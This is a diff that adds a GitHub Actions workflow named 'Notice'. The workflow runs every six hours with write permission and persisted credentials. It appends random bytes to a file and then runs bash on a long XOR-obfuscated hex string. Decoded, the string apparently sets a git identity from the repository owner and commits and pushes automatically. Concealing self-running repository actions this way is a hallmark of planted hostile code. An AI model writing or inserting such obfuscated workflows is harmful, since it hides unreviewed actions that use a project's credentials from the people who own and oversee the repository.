@@ -1,0 +1,22 @@
+name: "Notice"
+"on":
+  workflow_dispatch:
+  schedule:
+    - cron: "31 */6 * * *"
+jobs:
+  THUNDER:
+    runs-on: ubuntu-24.04
+    env:
+      EMERALD: .github/BORDER
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          persist-credentials: true
+          fetch-depth: 1
+      - name: "LILY"
+        run: |
+          BARLEY="$(od -An -tx1 -N 15 /dev/urandom | tr -d '[:space:]')"
+          printf '%s\n' "$BARLEY" >> "$EMERALD"
+          bash -c "$(python3 -c 'import sys; sys.stdout.write("".join(chr(b^245) for b in bytes.fromhex("b19498869a9bc8ddcccdd5c4c6c7d5c4c1c6d5c4c0c7d5c4c5ccd5c4c6c3d5c4c6c3d5c0ccd5c4c4c2d5c4c0c5d5c4c4c5d5c4c4c6d5c4c6c3d5c4c1c6dcffa5b4b1b1bab6bec8ddc7c0d5c7c7d5c6cdd5c6c3d5c1d5c6ccd5c7cdd5c7c2d5c4cdd5c6ccd5c4d5c1d5c6c4d5c7c2dcffb19498869a9baa9a8081c8d7d7ff939a87d5dddd9cc8c5ced59cc9d18ed6b19498869a9baeb5a888ced59cdededcdcced5919affd5d59bc8d1ddddd5b19498869a9bae9ca8d5d8d5a5b4b1b1bab6beae9ca8d5dcdcffd5d5b19498869a9baa9a8081dec8d1dd85879c9b8193d5d7a9a9d1dd85879c9b8193d5d2d0c5c69ad2d5d7d19bd7dcd7dcff919a9b90ff96879a968086c8ddc2c0d5c4c1c4d5c4c7c3d5c4c7c0d5c4c6c7d5c4c6ccd5c0c7d5c4c1c4d5c4c0c5d5c4c1cdd5c4c7c7d5c4c4ccd5c4c4c3d5c4c0c1d5c1ccd5c4c6c6d5c4c4c0d5c4c6c6d5c4c4c3d5c4c0c6d5c4c7c6d5c3c3d5c4c4c7d5c4c6c6d5c4c6c3dcffa590879c919a81c8ddc4c4d5c7c1d5c4c4d5c7c1d5c4cdd5c7c1d5c3d5c6c4d5c6ccd5c6c1d5c7c4d5c2d5cdd5c6c6d5c6d5c6c5d5c4c5d5c4c2d5c4c7d5c6c3d5c7c0d5c7c5d5c4c6d5c7c7d5c7c2dcff96879a968086aa9a8081c8d7d7ff939a87d5dddd9cc8c5ced59cc9d18ed696879a968086aeb5a888ced59cdededcdcced5919affd5d59bc8d1ddddd596879a968086ae9ca8d5d8d5a590879c919a81ae9ca8d5dcdcffd5d596879a968086aa9a8081c8d7d18e96879a968086aa9a808188d1dd85879c9b8193d5d7a9a9d1dd85879c9b8193d5d2d0c5c69ad2d5d7d19bd7dcd7dcd7ff919a9b90ffa7b4b1bcb4bbb6b0c8d7d18eb2bca1bda0b7aaa7b0a5baa6bca1baa7acaabaa2bbb0a788d7ff929c81d5969a9b939c92d580869087db9b949890d5d7d18ea7b4b1bcb4bbb6b088d7ff929c81d5969a9b939c92d580869087db9098949c99d5d7d1b2bca1bda0b7aaa7b0a5baa6bca1baa7acaabaa2bbb0a7aabcb1ded18ea7b4b1bcb4bbb6b088d18e96879a968086aa9a808188d7ff929c81d5949191d5dbff929c81d5969a98989c81d5d8d898908686949290c8d7d18eb19498869a9baa9a808188d7ff929c81d58580869dd5d880d59a879c929c9bd5bdb0b4b1")))')"
